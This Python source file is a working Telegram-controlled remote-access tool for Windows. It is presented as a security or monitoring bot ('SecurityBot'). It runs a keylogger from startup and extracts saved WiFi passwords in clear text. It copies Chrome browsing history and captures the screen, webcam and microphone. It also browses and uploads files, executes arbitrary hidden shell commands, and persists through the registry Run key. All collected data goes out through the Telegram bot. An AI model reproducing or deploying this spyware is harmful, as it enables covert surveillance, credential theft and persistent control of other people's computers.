# python
import logging
import asyncio
import shutil
import sqlite3
import sys
import winreg
import cv2
import psutil
import pyaudio
import wave
import requests
import os
import platform
import socket
import subprocess
import mss
import numpy as np
import pyttsx3
import string

from pynput import keyboard
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# --- CONFIGURATION (⚠️ PASTE YOUR TOKEN & ID HERE) ---
BOT_TOKEN = ' '
ALLOWED_USER_ID = 000000

# --- GLOBAL VARIABLES ---
current_dir = os.getcwd()
known_drives = set()
blocked_apps = []  # inlined from previous app1
key_logs = ""  # buffer for keylogger

# --- SETUP LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)


# --- SECURITY CHECK ---
def authorized(update: Update) -> bool:
    user_id = update.effective_user.id
    if user_id != ALLOWED_USER_ID:
        print(f"Unauthorized access attempt from: {user_id}")
        return False
    return True


# --- HELPER: Run Windows Commands ---
def run_cmd(command):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        output = subprocess.check_output(command, shell=True, startupinfo=startupinfo, stderr=subprocess.STDOUT,
                                         timeout=10)
        return output.decode('utf-8', errors='ignore').strip()
    except subprocess.TimeoutExpired:
        return "Error: Timeout (Command took too long)"
    except Exception as e:
        return f"Error: {str(e)}"


# ==========================================
# 🚀 FEATURE 1: WATCHDOG (Background Sentry)
# ==========================================
async def usb_watchdog(context: ContextTypes.DEFAULT_TYPE):
    """Checks for new USB drives every 10 seconds."""
    global known_drives

    # Get current drives (A-Z)
    current_drives = {f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")}

    # Initialize on first run
    if not known_drives:
        known_drives = current_drives
        return

    # Check for NEW drives
    new_drives = current_drives - known_drives
    if new_drives:
        msg = f"🚨 **SECURITY ALERT** 🚨\n\n⚠️ **New Drive Detected!**\nDrive Letter: `{', '.join(new_drives)}`\n\nSomeone plugged in a USB or mounted a drive."
        await context.bot.send_message(chat_id=ALLOWED_USER_ID, text=msg, parse_mode='Markdown')

    known_drives = current_drives


# ==========================================
# 🚀 FEATURE 2: NETWORK SCANNER
# ==========================================
async def scan_net(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return

    status_msg = await update.message.reply_text("⏳ **Scanning Network... (Wait 5s)**", parse_mode='Markdown')

    def scan():
        return run_cmd("arp -a")

    try:
        result = await asyncio.to_thread(scan)
        if len(result) > 3500:
            result = result[:3500] + "\n...[Truncated]"
        msg = f"📡 **Network Scan Results:**\n```\n{result}\n```"
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=status_msg.message_id,
                                            text=msg, parse_mode='Markdown')
    except Exception as e:
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=status_msg.message_id,
                                            text=f"❌ Scan Error: {e}")


# ==========================================
# 🚀 FEATURE 3: SYSTEM INFO (Deep Scan)
# ==========================================
async def sys_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return

    msg = await update.message.reply_text("⏳ **Fetching System Details...**", parse_mode='Markdown')

    def get_data():
        host = socket.gethostname()
        ip = socket.gethostbyname(host)
        os_ver = f"{platform.system()} {platform.release()}"
        av = run_cmd("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName")
        fw = "Active" if "ON" in run_cmd("netsh advfirewall show allprofiles state") else "Disabled"
        return host, ip, os_ver, av, fw

    try:
        h, i, o, a, f = await asyncio.to_thread(get_data)
        final_text = (
            f"🖥 **SYSTEM REPORT**\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 **Name:** `{h}`\n"
            f"🏠 **IP:** `{i}`\n"
            f"💿 **OS:** {o}\n"
            f"🛡 **Firewall:** {f}\n"
            f"🦠 **Antivirus:** {a.replace('displayName', '').strip()[:50]}"
        )
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id,
                                            text=final_text, parse_mode='Markdown')
    except Exception:
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id,
                                            text="❌ Scan failed")


# ==========================================
# 🚀 FEATURE 4: DESKTOP SPY (Screen Video)
# ==========================================
async def screen_record(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return

    await update.message.reply_text("⏳ **Recording Screen (10s)...**", parse_mode='Markdown')

    def record_task():
        output_file = "screen_rec.avi"
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(output_file, fourcc, 10.0, (monitor['width'], monitor['height']))
            for _ in range(100):  # 10 seconds * 10 FPS
                img = np.array(sct.grab(monitor))
                frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                out.write(frame)
            out.release()
        return output_file

    try:
        filename = await asyncio.to_thread(record_task)
        await update.message.reply_video(video=open(filename, 'rb'), caption="🖥️ Screen Capture")
    except Exception as e:
        await update.message.reply_text(f"❌ Recording failed: {e}")


# ==========================================
# 🚀 FEATURE 5: DATA MULE (File Browser)
# ==========================================
async def list_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    global current_dir

    await update.message.reply_text("⏳ **Listing Files...**", parse_mode='Markdown')

    try:
        items = os.listdir(current_dir)
        folders = [f"📂 {x}" for x in items if os.path.isdir(os.path.join(current_dir, x))]
        files = [f"📄 {x}" for x in items if os.path.isfile(os.path.join(current_dir, x))]

        content = "\n".join(folders[:15] + files[:15])
        if len(items) > 30:
            content += "\n... (and more)"

        await update.message.reply_text(f"📂 **Path:** `{current_dir}`\n\n{content}", parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")


async def download_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    global current_dir

    filename = ' '.join(context.args)
    filepath = os.path.join(current_dir, filename)

    if os.path.exists(filepath):
        await update.message.reply_text("⏳ **Uploading File...**", parse_mode='Markdown')
        try:
            await update.message.reply_document(document=open(filepath, 'rb'))
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
    else:
        await update.message.reply_text("❌ File not found.")


async def change_dir(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_dir
    target = ' '.join(context.args)
    new_path = os.path.abspath(os.path.join(current_dir, target))
    if os.path.isdir(new_path):
        current_dir = new_path
        await list_files(update, context)
    else:
        await update.message.reply_text("❌ Folder not found.")


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    await update.message.reply_text("⏳ **Checking Connectivity...**", parse_mode='Markdown')
    try:
        res = await asyncio.to_thread(requests.get, 'http://ip-api.com/json')
        data = res.json()
        await update.message.reply_text(f"🌍 **IP:** `{data.get('query')}`\n📍 **City:** {data.get('city')}",
                                        parse_mode='Markdown')
    except Exception:
        await update.message.reply_text("❌ Connection Error")


async def cam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    await update.message.reply_text("⏳ **Accessing Camera...**", parse_mode='Markdown')
    cam_capture = cv2.VideoCapture(0)
    ret, frame = cam_capture.read()
    if ret:
        cv2.imwrite('snap.jpg', frame)
        cam_capture.release()
        await update.message.reply_photo(photo=open('snap.jpg', 'rb'))
    else:
        cam_capture.release()
        await update.message.reply_text("❌ Camera Error")


async def listen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    await update.message.reply_text("⏳ **Recording Audio (5s)...**", parse_mode='Markdown')

    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    OUT = "rec.wav"
    p = pyaudio.PyAudio()

    def record():
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = [stream.read(CHUNK) for _ in range(0, int(RATE / CHUNK * 5))]
        stream.stop_stream()
        stream.close()
        p.terminate()
        wf = wave.open(OUT, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()

    await asyncio.to_thread(record)
    await update.message.reply_audio(audio=open(OUT, 'rb'))


async def system_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    cmd = update.message.text.lower()
    if '/lock' in cmd:
        os.system("rundll32.exe user32.dll,LockWorkStation")
        await update.message.reply_text("🔒 Locked.")
    elif '/sleep' in cmd:
        os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        await update.message.reply_text("💤 Sleeping.")
    elif '/shutdown' in cmd:
        os.system("shutdown /s /t 5")
        await update.message.reply_text("⚠️ Shutdown in 5s!")


async def cancel_shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    os.system("shutdown /a")
    await update.message.reply_text("✅ Cancelled.")


async def remote_exec(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    await update.message.reply_text("⏳ **Executing Command...**", parse_mode='Markdown')
    res = run_cmd(' '.join(context.args))
    if len(res) > 3000:
        res = res[:3000]
    await update.message.reply_text(f"```\n{res or 'Done'}\n```", parse_mode='Markdown')


async def kill_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    await update.message.reply_text("⏳ **Killing Process...**", parse_mode='Markdown')
    res = run_cmd(f"taskkill /f /im {' '.join(context.args)}")
    await update.message.reply_text(f"```\n{res}\n```", parse_mode='Markdown')


async def say(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    text = ' '.join(context.args)
    await update.message.reply_text(f"🗣️ **Speaking:** '{text}'", parse_mode='Markdown')

    def engine_say(t):
        engine = pyttsx3.init()
        engine.say(t)
        engine.runAndWait()

    await asyncio.to_thread(engine_say, text)


# ==========================================
# 🚀 FEATURE 1: KEYLOGGER (Background Thread)
# ==========================================
def start_keylogger():
    def on_press(key):
        global key_logs
        try:
            if hasattr(key, "char") and key.char is not None:
                key_logs += str(key.char)
            else:
                if key == keyboard.Key.space:
                    key_logs += " "
                elif key == keyboard.Key.enter:
                    key_logs += "\n"
                else:
                    key_logs += f"[{str(key)}]"
        except Exception:
            try:
                key_logs += f"[{str(key)}]"
            except Exception:
                pass

    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()


async def get_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    global key_logs
    if not key_logs:
        await update.message.reply_text("📭 Log is empty.")
        return

    await update.message.reply_text("⏳ **Fetching Keystrokes...**", parse_mode='Markdown')
    chunk_size = 4000
    for i in range(0, len(key_logs), chunk_size):
        await update.message.reply_text(f"```\n{key_logs[i:i + chunk_size]}\n```", parse_mode='Markdown')

    key_logs = ""


# ==========================================
# 🚀 FEATURE 2: WIFI PASSWORD EXTRACTOR
# ==========================================
async def get_wifi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    msg = await update.message.reply_text("⏳ **Extracting WiFi Passwords...**", parse_mode='Markdown')

    def extract():
        profiles_data = run_cmd("netsh wlan show profiles")
        profiles = [line.split(":")[1].strip() for line in profiles_data.split('\n') if "All User Profile" in line]
        results = []
        for profile in profiles:
            try:
                details = run_cmd(f'netsh wlan show profile name="{profile}" key=clear')
                key_line = [line.split(":")[1].strip() for line in details.split('\n') if "Key Content" in line]
                password = key_line[0] if key_line else "Open/No Key"
                results.append(f"📡 **{profile}**\n🔑 `{password}`")
            except Exception:
                continue
        return "\n\n".join(results)

    try:
        res = await asyncio.to_thread(extract)
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id,
                                            text=res or "❌ No WiFi found", parse_mode='Markdown')
    except Exception:
        await update.message.reply_text("❌ Error extracting WiFi")


# ==========================================
# 🚀 FEATURE 3: BROWSER HISTORY AUDITOR
# ==========================================
async def get_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    msg = await update.message.reply_text("⏳ **Grabbing Browser History...**", parse_mode='Markdown')

    def fetch_history():
        history_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\History"
        if not os.path.exists(history_path):
            return "❌ Chrome History not found."

        temp_path = os.path.expanduser('~') + r"\AppData\Local\Temp\History_Tmp"
        shutil.copy2(history_path, temp_path)

        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 15")
            rows = cursor.fetchall()
            conn.close()
            os.remove(temp_path)

            output = ""
            for row in rows:
                url = row[0][:50] + "..." if len(row[0]) > 50 else row[0]
                output += f"🔗 {url}\n"
            return output
        except Exception as e:
            return f"❌ Error reading DB: {e}"

    res = await asyncio.to_thread(fetch_history)
    await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id,
                                        text=f"📜 **Last 15 Sites:**\n\n{res}", parse_mode='Markdown')


# ==========================================
# 🚀 FEATURE 4: APP BLOCKER & WATCHDOG
# ==========================================
async def block_app(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    app_name = ' '.join(context.args)
    if app_name:
        blocked_apps.append(app_name.lower())
        await update.message.reply_text(f"🚫 **Blocked:** `{app_name}`", parse_mode='Markdown')
    else:
        await update.message.reply_text("⚠️ Usage: `/block chrome.exe`")


async def unblock_app(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    app_name = ' '.join(context.args)
    if app_name.lower() in blocked_apps:
        blocked_apps.remove(app_name.lower())
        await update.message.reply_text(f"✅ **Unblocked:** `{app_name}`", parse_mode='Markdown')


async def app_watchdog(context: ContextTypes.DEFAULT_TYPE):
    """Checks for blacklisted apps every 5 seconds."""
    if not blocked_apps:
        return

    tasks = run_cmd("tasklist")

    for app in blocked_apps:
        if app in tasks.lower():
            run_cmd(f"taskkill /f /im {app}")
            await context.bot.send_message(chat_id=ALLOWED_USER_ID,
                                           text=f"🛡️ **Security Protocol**\nKilled forbidden app: `{app}`",
                                           parse_mode='Markdown')


# ==========================================
# 🚀 FEATURE 5: STARTUP PERSISTENCE
# ==========================================
async def install_startup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    await update.message.reply_text("⏳ **Installing to Registry...**", parse_mode='Markdown')

    try:
        exe_path = sys.argv[0]  # Path to this script/exe
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                             winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "SecurityBot", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        await update.message.reply_text("✅ **Success:** Bot will auto-start with Windows.", parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {e}")


# --- inlined start_alert from previous app1 ---
async def start_alert(context: ContextTypes.DEFAULT_TYPE):
    """Sends alert when bot comes online (Login Alert)"""
    await context.bot.send_message(chat_id=ALLOWED_USER_ID, text="🔔 **System Online:** Bot is active and listening.",
                                   parse_mode='Markdown')


# ==========================================
# 1. HEALTH & HARDWARE STATS
# ==========================================
async def system_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    msg = await update.message.reply_text("⏳ **Measuring Performance...**", parse_mode='Markdown')

    def get_metrics():
        cpu = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory()
        boot = psutil.boot_time()
        import datetime
        boot_str = datetime.datetime.fromtimestamp(boot).strftime("%Y-%m-%d %H:%M:%S")
        return cpu, ram, boot_str

    cpu, ram, boot = await asyncio.to_thread(get_metrics)

    bar_len = 10
    filled = int(cpu / 100 * bar_len)
    bar = "█" * filled + "░" * (bar_len - filled)

    report = (
        f"📊 **SYSTEM HEALTH**\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🧠 **CPU:** `{cpu}%` [{bar}]\n"
        f"💾 **RAM:** `{ram.percent}%` (Free: {round(ram.available / 1024 ** 3, 1)} GB)\n"
        f"🚀 **Boot:** `{boot}`"
    )
    await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=report,
                                        parse_mode='Markdown')


async def disk_usage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update): return
    msg = await update.message.reply_text("⏳ **Scanning Drives...**", parse_mode='Markdown')

    def scan():
        report = "💾 **DISK STORAGE**\n━━━━━━━━━━━━━━━\n"
        for p in psutil.disk_partitions():
            try:
                u = psutil.disk_usage(p.mountpoint)
                total = round(u.total / (1024 ** 3), 1)
                used = round(u.used / (1024 ** 3), 1)
                icon = "🟢" if u.percent < 80 else "🔴"
                report += f"{icon} **{p.device}** ({u.percent}%)\n   `{used} GB` / `{total} GB`\n\n"
            except Exception:
                continue
        return report

    res = await asyncio.to_thread(scan)
    await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=res,
                                        parse_mode='Markdown')


# --- MAIN STARTUP ---
if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Register Commands (name -> handler)
    cmds = {
        "status": status, "cam": cam, "listen": listen,
        "lock": system_control, "sleep": system_control, "shutdown": system_control, "cancel": cancel_shutdown,
        "info": sys_info, "exec": remote_exec,
        "rec": screen_record, "ls": list_files, "cd": change_dir,
        "get": download_file, "kill": kill_process, "say": say,
        "stats": system_stats, "disk": disk_usage,
        "net": scan_net,
        "keys": get_keys, "wifi": get_wifi, "history": get_history,
        "block": block_app, "unblock": unblock_app, "install": install_startup
    }

    for name, handler in cmds.items():
        app.add_handler(CommandHandler(name, handler))

    # Register Background Jobs
    if app.job_queue:
        app.job_queue.run_repeating(usb_watchdog, interval=10, first=5)
        app.job_queue.run_repeating(app_watchdog, interval=5, first=5)
        try:
            app.job_queue.run_once(start_alert, when=2)
        except Exception:
            # if start_alert has a different signature, ignore
            pass
        print("✅ Watchdog Active.")

    # Start keylogger
    start_keylogger()

    print("✅ ArtifactZero_bot RUNNING...")
    app.run_polling()
